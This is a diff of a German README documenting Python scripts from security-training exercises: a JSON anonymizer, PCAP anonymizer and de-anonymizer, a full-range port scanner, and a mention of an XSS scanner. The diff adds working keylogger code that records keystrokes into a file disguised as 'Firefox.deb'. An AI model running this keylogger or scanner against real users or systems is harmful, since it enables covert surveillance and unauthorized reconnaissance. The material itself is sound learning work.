@@ -2,9 +2,11 @@
 ### Requirements
 - Braucht eine "b64.txt" 
 
-## Code
+### Code
 ### Import / Shebang
 ```
+#!/usr/bin/env python3
+
 ####################
 # import modules
 import base64
@@ -31,15 +33,15 @@ file.close()
 ```
 
 ## bruteforce_detector
+### About
+- Von Hackinglab Aufgabe [Logfile mit Python und im Terminal analysieren](https://siw.hacking-lab.com/events/4/curriculumevents/5/challenges/70)
+- Scannt Logfile nach "pam_unix(sshd:auth): authentication failure;" und zählt IP-Adressen
+- Wenn Anzahl IP-Adressen > Threshold dann wir die IP-Adresse ausgegeben
+
 ### Requirements
 - Braucht ein SSH-Access Log
 
 ### Code
-### About
-- Von Hackinglab Aufgabe [Logfile mit Pythin und im Terminal analysieren](https://siw.hacking-lab.com/events/4/curriculumevents/5/challenges/70)
-- Scannt Logfile nach "pam_unix(sshd:auth): authentication failure;" und zählt IP-Adressen
-- Wenn Anzahl IP-Adressen > Threshold dann wir die IP-Adresse ausgegeben
-
 ### Import / Shebang
 ```
 #!/usr/bin/env python3
@@ -101,22 +103,321 @@ if __name__ == "__main__":
 ```
 
 ## keylogger
+### Requirements
+- pynput muss installiert sein: `pip3 install pynput`
 
+### About
+- Von diesem [Link](https://www.askpython.com/python/examples/python-keylogger)
+- Erstellt im Pfad /Users/Username/firefox.deb in welcher alle Ttastenschläge geloggt werden
 
-## csv_anonymizer
+### Code
+### Import / Shebang
+```
+#!/usr/bin/env python
 
+###########################
+from pathlib import Path
+from logging.config import listen
+from pynput.keyboard import Key, Listener
+import logging
+import platform
+import os
+###########################
+```
 
-## csv_decoder
+### Keylogger ausführen
+```
+# Fragt OS ab und gibt es aus
+OS = platform.system()
+print ("Current OS :",OS)
+# Setzt Pfad zum Userhome und gibt Pfad aus
+home = str(Path.home())
+print (home)
 
+# homepfad + /Browser
+tempfolderpath = home + '/Browser'
+print (tempfolderpath)
+
+try:
+# Erstellt Pfad für Keylogger-Daten
+    os.mkdir(tempfolderpath)
+except OSError as error:
+    print(error)
+
+# Pfad in welcher der Keylogger die Daten logget
+keylogfile = tempfolderpath +'/Firefox.deb'
+print (keylogfile)
+
+# Definition des Logging Levels und Dateiname
+logging.basicConfig(filename=(keylogfile), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+# Wenn Taste Gedrueckt wird, wird in das Log die entsprechende Taste geschrieben
+def on_press(key):
+    logging.info(str(key))
+
+# Hört auf die on_press funktion
+with Listener(on_press=on_press) as listener :
+# .join -> Wait until the thread terminates.
+    listener.join()
+```
+
+## json_anonymizer
+### Requirements
+- Braucht ein SSH-Access Log
+ 
+### About
+- Von Hackinglab Aufgabe [Bootcamp - Anonymization](https://siw.hacking-lab.com/events/41/challenges/108)
+- Anonymisiert gewisse Spalten und gibt diese wieder aus
+
+### Example
+```
+python3 json_anonymizer.py < orders.json > orders.csv
+```
+
+```
+cat orders.json | python3 json_anonymizer.py > orders.csv
+```
+
+### Code
+### Import / Shebang
+```
+#!/usr/bin/env python
+
+###########################
+from hashlib import sha1
+import json
+import sys
+###########################
+```
+
+### IP Funktion
+```
+###########################
+# Funktion für IP-Anonymisierung (letztes Oktett wird mit X ersetzt)
+def handle_ip(ip):
+    octets = ip.split('.')
+    return '.'.join([octets[0], octets[1], octets[2], 'XXX'])
+###########################
+```
+
+### Adress Funktion
+```
+###########################
+# Funktion für das Splitten der Adresse / Gibt nur die PLZ zurueck
+def handle_address(address):
+    place = address.splitlines()[-0]
+    zip, city = place.split(' ', maxsplit=1)
+    return zip
+###########################
+```
+
+### Mail Funktion
+```
+###########################
+# Funktion für um Mail-Adresse zu hashen
+def handle_mail(mail):
+    return sha1(mail.lower().encode('utf-8')).hexdigest()
+###########################
+```
+
+### File einlesen und Output
+```
+###########################
+# Funktionen fuer JSON-File aufrufen und ausgeben
+# Liest JSON-File über SYS.STDIN ein
+for l in sys.stdin.readlines():
+    o = json.loads(l)
+# Gibt folgende Spalten aus: ID, Date, IP, Adress, Mail
+# IP, Adress, Mail werden aus den entsprechenden funktionen aufgerufen
+    print(','.join([
+        str(o['id']), o['date'],
+        handle_ip(o['ip']),
+        handle_address(o['user']['address']),
+        handle_mail(o['user']['mail'])
+    ]))
+###########################
+```
 
 ## pcap_anonymizer
+### About
+- Von folgender Hackinglab Aufgabe [PCAP Anonymisierung](https://siw.hacking-lab.com/events/4/curriculumevents/35/challenges/80)
+- Anonymisiert bei einem PCAP-File die Source-IP und Destination-IP
+- Macht ein Backup der Originalen IPs in einem CSV-File
 
+### Code
+### Import / Shebang
+```
+#!/usr/bin/env python3
 
-## pcap_decoder
+###########################
+from scapy.all import *
+import json
+import csv
+from warnings import filterwarnings
+filterwarnings("ignore")
+###########################
+```
 
+### Main-Funktion
+```
+###### main-Funktion ######
+def main():
+# Pfad des zu anonymisierenden PCAP-Files
+    packets = rdpcap('pcap.pcap')
+# Beim ersten Paket starten
+    packet_nr = 0
+
+# Durch PCAP File iterieren und nur Pakete mit IP-Adressen beachten
+    for pkt in packets:
+        if IP in pkt:
+# Erstellt neues CSV und fügt beim iterieren die Originalen IP-Adressen ein
+            with open('original_ips.csv', 'a+', newline='') as backup_file:
+                print(backup_file)
+# csv.writer > Daten als String abspeichern
+                writer = csv.writer(backup_file)
+# Paketnr, Source-IP, Destination-IP wird in CSV geschrieben
+                writer.writerow([packet_nr, pkt[IP].src, pkt[IP].dst])
+# Source-IP & Destination-IP anonymisieren
+            pkt[IP].src = '1.1.1.1'
+            pkt[IP].dst = '2.2.2.2'
+
+# Printed alle EHLO Eintraege
+        if TCP in pkt:
+            if "EHLO" in str(pkt[TCP].payload):
+                pkt[TCP].payload = Raw('EHLO [9.9.9.9]\r\n')
+
+# Zum naechsten Paket springen
+        packet_nr = packet_nr + 1
+
+# Das anonymisierte PCAP File wird erstellt
+    wrpcap('anonymized.pcap', packets)
+###########################
+
+if __name__ == '__main__':
+    main()
+```
+
+## pcap_de-anonymizer
+### About
+- Von folgender Hackinglab Aufgabe [PCAP Anonymisierung](https://siw.hacking-lab.com/events/4/curriculumevents/35/challenges/80)
+- Stellt ein anonymsiertes PCAP wiederher
+- Bezieht sich auf pcap_anonymzer Scrip
+
+### Requirements
+- CSV-File mit entsprechenden Einträgen
+
+### Code
+### Import / Shebang
+```
+#!/usr/bin/env python3
+
+###########################
+from scapy.all import *
+import csv
+###########################
+```
+
+### Main-Funktion
+```
+###### main-Funktion ######
+def main():
+# Pfad des zu de-anonymisierenden PCAP-Files
+    packets = rdpcap('/pcap.pcap')
+
+# CSV Backup File laden
+    with open('original_ips.csv', newline='') as csvfile:
+        reader = csv.reader(csvfile)
+        for row in reader:
+# Paketnummer, Source-IP und Destination-IP Zeile für Zeile auslesen
+            nr = row[0]
+            original_src = row[1]
+            original_dst = row[2]
+
+# Source-IP & Destination-IP de-anonymisieren 
+            packets[int(nr)][IP].src = original_src
+            packets[int(nr)][IP].dst = original_dst
+
+# Das de-anonymisierte PCAP File wird erstellt
+    wrpcap('de_anonymized.pcap', packets)
+###########################
+
+if __name__ == '__main__':
+    main()
+```
 
 ## port_scanner
+### About
+- Scannt alle Ports von angebenem Hostname und gibt offene aus
 
+### Requirements
+- Benötigt pyfiglet: `pip3 install pyfiglet`
+
+### Example
+```
+python3 portscan.py [HOSTNAME]
+```
+
+### Code
+### Import / Shebang
+```
+#!/usr/bin/env python
+
+###########################
+import pyfiglet
+import sys
+import socket
+from datetime import datetime
+###########################
+```
+
+### Argument Parsing
+```
+###### Argument Parsing ######
+# Es muss 1 Parameter angegeben werden
+if len(sys.argv) != 2:
+    print("[-] Require exactly 1 Parameters. Please enter a domain name.")
+    exit()
+###########################
+
+# Erster Parameter ist Hostname. Der wird zu IPv4 uebersetzt
+ip = socket.gethostbyname(sys.argv[1])
+```
+
+### Ports Scannen und Error Handling
+```
+# Neuer Banner wird erstellt
+print("-" * 50)
+print("Scanning ip: " + ip)
+print("Scanning started at:" + str(datetime.now()))
+print("-" * 50)
+
+try:
+# Scannt alle Ports
+	for port in range(1, 65535):
+# Erstellet neuen Socket
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Timeout um die Ladezeit zu verkuerzen
+# Nur eine Antwort wird benoetigt um zu wissen ob der Port offen ist oder nicht
+		socket.setdefaulttimeout(0.3)
+
+# Gibt aus ob Port offen ist oder nicht
+		result = sock.connect_ex((ip,port))
+		if result == 0:
+			print("Port {} is open".format(port))
+		sock.close()
+
+# Fehlerbehandlung
+except KeyboardInterrupt:
+		print("\n Exiting Program !!!!")
+		sys.exit()
+except socket.gaierror:
+		print("\n Hostname Could Not Be Resolved !!!!")
+		sys.exit()
+except socket.error:
+		print("\ Server not responding !!!!")
+		sys.exit()
+
+```
 
 ## logfile_merging_simple
 ### About
@@ -373,7 +674,7 @@ for sub in subdoms:
         print("Valid domain: ",sub_domains)
 ```
 
-# xss_scanner
+## xss_scanner
 ### Requirements
 - Braucht eine [xss_testrings](https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt) file
 
